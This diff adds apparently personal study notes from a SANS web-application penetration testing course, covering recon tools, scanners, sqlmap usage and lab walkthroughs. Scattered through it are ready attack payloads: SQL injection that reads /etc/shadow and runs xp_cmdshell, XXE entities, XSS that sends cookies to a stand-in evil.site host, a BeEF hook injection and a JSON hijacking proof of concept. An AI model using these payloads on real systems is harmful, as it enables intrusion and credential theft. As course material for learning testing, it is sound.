@@ -1,0 +1,534 @@
+Login = sec542	
+password = SANSUSER
+
+Login = samurai
+password = samurai
+
+Sample permission memo:
+	www.counterhack.net/permission_memo.html
+
+New Response Codes - came out 5/15/2012:
+	511	Network Authentication Required 
+
+ZAP - Web app pentesting tool
+	will replace WebScarab
+ 
+Reporting tools:
+	MediaWiki
+	MoinMoin
+	CAL9000 from OWASP
+	FreeMind
+	MindMapper
+
+Report Generation Tools:
+	The OWASP Report Generator
+
+
+JavaScript
+	client side script
+
+Google has a class on python for free
+
+Fierce Domain Scanner
+	perl fierce.pl -dns sec542.org
+	perl fierce.pl -range 192.168.1.0-255 -dnsserver ns1.sec542.org
+	perl fierce.pl -dns sec542.org -wide -output output.txt
+
+dig -> domain transfer
+	dig -t AXFR sec542.org
+host -> domain transfer
+	host -la sec542.org
+
+Google GXFR - tool to dns zone transfer using google
+Manule zone transfer using google:
+	site:sans.org -site:www.sans.org
+	site:sans.org -handlers
+
+Foundstones SiteDigger:
+	automates searches
+	www.foundstone.com/us/resources/proddesc/sitedigger.htm
+
+Goolag Scanner -> on Samurai CD
+	www.goolag.org/download.html
+
+Google Groups:
+	insubject: "Problems with my code"
+	author:kjohnson@sans.org	
+		must be a member of the group to search by author
+
+Social Network Parsing:
+	gpscan.rb 	-> search Google profiles
+			www.digininja.org/projects/gpscan.php
+			./gpscan.rb Microsoft
+
+	Named Reconnoiter	-> uses LinkedIn accounts from target 
+				   employees to generate potential login names
+				sourceforge.net/projects/reconnoiter/
+				./usernameGen.py InGuardians 10
+
+Bing Search engine:
+	ip:66.135.47.101
+	Will show you every site that Bing knows about on this IP
+
+
+./nikto.pl -host www.sec542.org -Format HTM -output nikto.html
+
+
+spidering with wget:
+	wget -e robots=off -r http://www.sec542.org --no-check-certificate
+		turns off robots.txt restrictions
+
+CeWL -spiders an web site and then generates a word list for use as passwords
+	or other dictionaries for attacks
+	./cewl.rb http://www.sec542.org -w ~/cewl_wordlist
+
+Kivio and Omnigraffle - Flow charting a web site
+
+Visio 	-will spider website and make a flowchart diagram for you
+
+WebSecurify -> automated scanner from GnuCitizen
+	http://www.websecurify.com
+	It has an API to tie into application deployments
+
+skipfish -> automated scanner
+	./skipfish -W /dictionary.wl -o ~/Desktop/results/ http://www.sec542.org
+
+	
+w3af -> Console usage:
+	#profiles
+	#use jimmyprofile
+	plugins
+	output console,textFile
+	output config textFile
+	set fileName scan.txt
+	back
+	discovery allowedMethods
+	audit osCommanding
+	back
+	target
+	set target https://www.sec542.org
+	back
+	start
+
+FuzzDB -> db of fuzzable attack strings
+	http://code.google.com/p/fuzzdb
+
+Burp Intruder -> password guessing
+	Send POST request to 'Intruder'
+	click 'Clear <symbol>'
+	Click right before password and right after the password and then 
+		click 'Add <symbol>'
+	Swith to Payloads tab
+	Set the 'payload set' to 'runtime file' in drop down
+	Press 'Select file' -> select passwords file
+	Go to Options tab for Intruder
+	Scroll down to Grep
+	Check the box 'Search REsponses for these Expressions' and add 
+		the phrase 'Accepted!' to the list
+	Click 'Start' on the 'Intruder' menu
+	Click 'Ok'
+	Double click requests to see them
+
+
+
+Google Search:
+	intitle:"Index of" "Last Modified"
+	Narrow the search more with:
+		site:targetdomain.com
+
+TamperData -> firefox plugin for SQL injection and/or XSS discovery
+
+SQL Inject Me -> firefox extention against forms
+	released by Security Compass
+
+Absinthe	-> blind sql injection tool; also works on normal injection
+
+SQLMap 		-> blind sql injection tool
+		http://sqlmap.sourceforge.net
+		is part of w3af
+
+'Web Application Obfusification' book -> look for it in safari
+
+Bypassing filters -> http://ha.ckers.org/xss.html
+
+Tools for discovering XSS flaws
+	Web Developer Extension
+	Live HTTP Headers Extension
+	TamperData
+	XSS Me
+	GreaseMonkey -> is an active browsing component ->dynamically adds
+		scripts to a page
+		Interesting Scripts:
+			PostInterpreter 
+			XSS Assistant from www.whiteacid.org
+	Burp Suite
+
+
+AJAX Discovery:
+	Sprajax
+	Ratproxy
+
+sprAJAX -> Spiders AJAX applications
+	Limited to Microsoft AJAX frameworks
+	Can remove the check for Microsoft so that it can scan other frameworks
+
+Ratproxy	->passive scanner
+		http://code.google.com/p/ratproxy
+		Will decompile flash objects
+		./ratproxy -w rat.log -v rat -d sec542.org -xtfscgjX
+		./ratproxy-report.sh rat.log > rat.html
+			-w write rat.log
+			-v use directory rat
+			-d specified domain only (default is all)
+			-x log all XSS candidates
+			-t log all directory traversal candidates
+			-f log all Flash applications for analysis
+			-s log all POST requests for analysis
+			-c log all cookie setting URLs for analysis
+			-g perform XSRF token checks on all GET requests
+			-j report on risky Javascript constructions
+			-X disruptively validate XSRF, XSS protections
+			-P use upstream proxy (-P host:port)
+GWTEnum -> tool will parse google web toolkit libraries
+	shows what functions are exposed via API
+	http://www.gdssecurity.com
+
+Entities:
+	<!ENTITY pass SYSTEM "/etc/passwd">
+	<!ENTITY intra SYSTEM "http://intranet/index.html">
+
+XPATH Injection:
+	XML Documents are data stores
+	Location paths describe where we are
+		/Organization/Groups/Security
+	/ by itself references the root node
+	* is a wild card
+	@ is used to select attributes
+	. and .. are teh current node and its parent respectiviely
+
+	XPATH Queries:	
+		//Member		->returns all of the members in phonebook
+		/Groups/Security/Member/[Name="Tony*"]
+			retuns members who's name starts with Tony
+		//@type="office"
+			returns all attributes of a specific type
+
+SOAP Tools:
+	WebScarab
+	WebService Studio
+		webservicesstudio.codeplex.com -> from Microsoft
+	SOAPUI
+		./soapui.sh
+		./java -jar ./burp  #turn off intercept mode
+		back to soapui
+		In File -> Preferences set up the burp proxy 127.0.0.1 port 8080
+		Click File-> New soapUI Project
+		The Project name should be "testing"
+		The Initial WSDL would be "http://www.sec542.org/scanners/webservice/ws-helloWorld.php?wsdl"
+		Check the box for  "Creates a Testsuite for the imported WSDL or WADL"
+		Click OK
+		A new window will open to generate the testsuite.
+		Click OK
+		In the main window, expand each of the tree items
+		Right click on the "Security Tests"
+		Click "New SecurityTest"
+		Click OK
+		A window will open
+		Right click on the "hello (0 scans)"
+		Select "Add SecurityScan"
+		Select XSS and then OK
+		Add parameters and explore the interfaces.
+		As you use SOAPUI, keep in mind that right-clicking the test cases is 
+			where you can add new cases.
+		After exploring the interface and building various cases, try the other 
+			web services.  To find them, the url is 
+			http://www.sec542.org/scanners/webservice/
+
+	WSDigger	->tool from foundstone
+
+****************************************************************************************
+WSFuzzer	->owasp tool for SOAP fuzzing (WSDL)
+	http://www.owasp.org/index.php/Category:OWASP_WSFuzzer_Project
+
+The two targets are http://www.sec542.org/scanners/webservice and http://sugarcrm.sec542.org
+
+The user name for SugarCRM is sec542 and the password is SANSUSER  This account has
+administrative access to SugarCRM.  If you would like, you can visit the site and 
+log in to see the normal web interface.
+
+Some notes regarding the application:
+	The command to run it is ./WSFuzzer.py (This is the beginnning of each command.)
+	The output directory is ~/Desktop/WSFuzzer/results 
+
+To run WSFuzzer, you need to change into the WSFuzzer directory.  Do this by opening a terminal and typing the following command:
+
+cd /usr/bin/samurai/wsfuzzer
+
+Now open a browser and visit http://www.sec542.org/scanners/webservice/
+The browse to each of the following pages:
+	
+	- ws-commandinj.php
+	- ws-helloWorld.php
+	- ws-sqli.php
+
+Select the WSDL for each to see the features offered.
+
+Next visit http://sugarcrm.sec542.org/soap.php/ and check the WSDL for each of the services offered there.
+
+The next step is to fuzz the services.  We will start with the ws-helloWorld.php file.
+
+Switch from the browser back to the terminal you opened.  In this terminal type the following command:
+
+./WSFuzzer.py -w http://www.sec542.org/scanners/webservice/ws-helloWorld.php?wsdl
+
+The system will ask a series of questions.  First press enter for the results directory.  This will place the results in the current directory.  Next enter A for the methods. Next select 1 for Fuzz type.  The path to enter for the dictionary is as follows:
+
+	/usr/bin/samurai/wsfuzzer/All_attack.txt
+
+Enter N for the automated fuzzing. Then enter N to disable IDS evasion and N for altering the host header.
+Now enter Y to begin fuzzing.  
+
+WSFuzzer will print where it is saving the results.  After it runs, examine this directory.  Open the HTML file in your browser to see the report.
+
+After you are finished, examine the other options within WSFuzzer.  You can see these by running ./WSFuzzer.py without any options.  You should then run the first command against any of the other webservices listed in the beginning of these notes.  You can also use the XML files in the ~/Desktop/WSFuzzer as sample requests with the --xml option
+
+
+****************************************************************************************
+
+Flash
+	crossdomain.xml	-> XML file placed in web root to control who can connect to
+			 you via flash.  It does allow wildcard *
+				*.sec542.org will match:
+					www.sec542.org
+					sec542.org
+					dev.sec542.org
+	
+	Site-control	->this policy sets the control for the domain. multiple options
+			none		-> no policy files are allowed
+			master-only	-> only the file in the root is read
+			by-content-type	-> uses the Content-Type header set to 
+				text/x-cross-domain-policy
+			by-ftp-filename	-> only crossdomain.xml files are allowed
+			all		-> all files are allowed
+
+	Flare		->flash decompiler for action script v2.  v3 is current version
+			./flare file.swf
+
+	HP SWFScan	->windows app that evaluates SWF files for vulnerabilities
+			supports both ActionScript v2 and v3
+			lets us see source code and look for vulnerabilities
+
+	SWF Investigator	-> from Adobe.  New tool.  Better then Flare
+
+	SWFIntruder		-> Will show areas to test for XSS 
+				Tons of false positives.  Just gives a place to start
+				looking
+
+Java Applets (client side)	-> Uses JRE
+	The 'APPLET' tag is deprecated.  But is still used A LOT!
+	Grab the Class Files and the Web page, put them in a directory
+	SCRIPTABLE and MAYSCRIPT configure the applet
+		MAYSCRIPT	->allows communication from applets to JavaScript
+		SCRIPTABLE	->allows JavaScript to interact with applets, IE only
+
+	Class Files	->This is the JAVA after it has been compiled.  Runs in the
+			JVM
+			These are the files loaded to run the applet
+
+	JAD 	->Java Decompiler
+		./jad -v MyAddress.class
+			the -v tells it to list the method names as it decompiles
+			Load each .jad file in a text editor.  Review for items such
+				as HTTP calls or network functions
+
+Fingerprinting the Database:
+	Master database adn schema tables:
+		MS SQL 		-> select name from master..sysobjects where xtype = 'U';
+		Oracle		-> select tables_name from user_tables;
+		PostgreSQL	-> select relname from pg_class;
+		MySQL		-> select Select_priv from mysql.dlb;
+
+	MySQL -> ' union select load_file('/etc/shadow'),1 #
+		select * from table into outfile '/result';
+		
+	MSSQL -> BULK INSERT table FROM 'c:\boot.ini' --
+
+	PostGRES -> COPY mydata FROM '/etc/passwd';
+		    COPY mydata TO '/tmp/data';
+
+	OS Interaction in 4 commands:
+		'; exec master.xp_cmdshell 'route print > results.txt' --
+		'; create TABLE results (outp varchar(5000)); --
+		'; BULK INSERT results FROM 'results.txt' with (rowterminator= "\n\n\n\n"); --
+		'; and 1 in (select outp from results) --
+
+SQLMAP
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --users
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --current-user
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --tables
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --columns
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --schema
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --passwords
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --is-dba
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --file-read=/etc/hosts
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --os-shell
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --os-cmd=<OS Command> 
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --os-pwn --msf-path /framework3      #meterpreter 
+	./sqlmap.py -u http://sec542.org/scanners/sqli.php?name=Kevin --priv-esc    #privilege escalation
+
+
+	./sqlmap.py -u "http://<site>" --data="username=1&password=2"	./sqlmap.py -u "http://<site>" --data="username=1&password=2” --dbs	./sqlmap.py -u "http://<site>" --data="username=1&password=2" -D stuff --tables	./sqlmap.py -u "http://<site>" --data="username=1&password=2" -D stuff –T items --dump		stuff is the DB name
+		items is the Table name
+	./sqlmap.py --dump-all -g "site:sec542.org ext:php"
+		dumps all information from google about the web site with php pages
+		then attempts to sql inject the parameters
+
+	./sqlmap.py -u http://sec542.org/index.php?param= --method="POST" --dbms=mysql --dump-all --level=5 --risk=3 --data=blablalba --cookie="blablabl"
+		-u URL
+		--data 		data string to be sent through POST
+		--cookie	HTTP cookie header
+		--level=5 	Level of tests to perform (1-5, default 1)
+		--risk=3	Risk of tests to perform (1-3, default 1)
+		--dump-all	Dump all DBMS database tables entries 
+		--dump <db name> Dump Database by name
+		--method="POST"	use POST method
+
+	./sqlmap.py -u http://192.168.0.103/HacmeBank_v2_Website/aspx/login.aspx --dump-all --level=5 --risk=3 --data="__VIEWSTATE=dDwtarPj9BldRpGQdExe&txtUserName=&txtPassword=&btnSubmit=Submit"	
+
+	burp suite plugin:
+		http://blog.buguroo.com/?p=2471&lang=en
+		Right click and say 'send to sqlmap' within burp
+
+
+Preparted Injection FIles, pre-built web shells
+	phpshell	
+	Ajaxshell	 
+	Laudanum	-> http://laudanum.secureideas.net
+		designed for pen testers
+
+XSS
+	http://www.secureideas.net/tools
+
+	<script>documnet.write('<img src="http://evil.site/'+document.cookie+'">')</script>
+
+	Cookie Catcher ->this code logs the cookies in a simple format.
+
+	Redirect a user -> <script language="javascript">window.location.href = "otherpage.html" ;</script>
+
+	External Scripts -> <script src="http://evil.site/bad.js"></script>
+
+	<IMG SRC="javascript:alert('XSS');">
+	<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+	<IMG SRC="javascript:alert(&quot;XSS&quot;)>
+	<IMG SRC='a' onerror=alert(1)>
+
+
+Pull local IP address using http://reglos.de/myaddress/ in XSS attack
+
+Yokoso! ->fingerprints infrastructure through XSS
+	http://yokoso.secureideas.net
+
+Durzosploit	-> script injection exploitation tool
+		similiar to Metasploit but focused on creating XSS payloads
+		has pre-packaged payloads
+		Obfuscator to help hide payloads
+	
+		./durzosploit
+		session new jimmy
+		search exploits
+		load twitter.com/update_status
+		enter status "Gotcha!"
+		generate
+		search obfuscators
+		obfuscate packr
+		quit
+		Get user to execute script: <script src="http://evil.site/jimmy.js"></script>
+
+XSS Frameworks:
+	AttackAPI -> collection of attacks more then a framework
+		www.gnucitizen.org/projects/attackapi
+			Extension Scanner 	->determines firefox extentions
+			HistoryDumper		->view visited links
+			AuthenticationForce	->brute force basic and digest authentication
+			NetworkSweeper		->Sweeps network for hosts
+			PortScanner		->Port scanner
+			URLScanner/Fetcher	->Scan for specified URLs, fetch the URL
+			channel.php		->stripped down bi-directional control.  
+						establishes a bi-directional channel between the
+						browser and the attacker
+						Disabled by default -> remove the .htaccess file
+							to enable this functionality
+	BeEF	->
+		Uses hook.js to hook the browser
+			<script src=http://beefserver:3000/hook.js></script>
+		Injection this script via XSS
+		./beef
+		http://192.168.1.8:3000/ui/authentication
+			user: beef pw: beef
+
+MonkeyFist -> automate XSRF exploitation
+		http://hexsec.com/labs
+
+
+********************************
+JSON -
+JavaScript Object Notation (JSON) is a language and platform independent format for data 
+interchange. JSON is in widespread use with a number of JSON parsers and libraries available 
+for different languages. While some information is available for JSON hijacking this attack is 
+not very well understood.
+
+JSON Hijacking as the name suggests is an attack similar to Cross-Site Request Forgery where an
+attacker can access cross-domain sensitive JSON data from applications that return sensitive 
+data as array literals to GET requests. An example of a JSON call returning an array literal is
+shown below:
+
+ [{"id":"1001","ccnum":"4111111111111111","balance":"2345.15"},{"id":"1002","ccnum":"5555555555554444","balance":"10345.00"},{"id":"1003","ccnum":"5105105105105100","balance":"6250.50"}]
+
+This attack can be achieved in 3 major steps:
+
+Step 1: Get an authenticated user to visit a malicious page.
+
+Step 2: The malicious page will try and access sensitive data from the application that the 
+	user is logged into. This can be done by embedding a script tag in an HTML page since 
+	the same-origin policy does not apply to script tags. 
+	<script src="http://<json site>/json_server.php"></script>
+
+	The browser will make a GET request to json_server.php and any authentication cookies 
+	of the user will be sent along with the request.
+
+Step 3: At this point while the malicious site has executed the script it does not have access 
+	to any sensitive data. Getting access to the data can be achieved by using an object 
+	prototype setter. In the code below an object prototypes property is being bound to the 
+	defined function when an attempt is being made to set the “ccnum” property.
+
+	Object.prototype.__defineSetter__('ccnum',function(obj){
+		secrets = secrets.concat(" ", obj); 
+	});
+
+	At this point the malicious site has successfully hijacked the sensitive financial data 
+	(ccnum) returned by json_server.php
+ 
+
+It should be noted that not all browsers support this method; the proof of concept was done on 
+Firefox 3.x. This method has now been deprecated and replaced by the use Object.defineProperty 
+There is also a variation of this attack that should work on all browsers where full named 
+JavaScript (e.g. pi=3.14159) is returned instead of a JSON array.
+
+There are several ways in which JSON Hijacking can be prevented:
+
+Since SCRIPT tags can only generate HTTP GET requests, only return JSON objects to POST 
+requests.
+
+Prevent the web browser from interpreting the JSON object as valid JavaScript code.
+
+Implement Cross-Site Request Forgery protection by requiring that a predefined random value be 
+required for all JSON requests.
+
+********************************
+
+Static Analysis
+
+CAT.NET -> Free .NET static analysis tool
+
+FxCop -> Free .NET static analysis tool
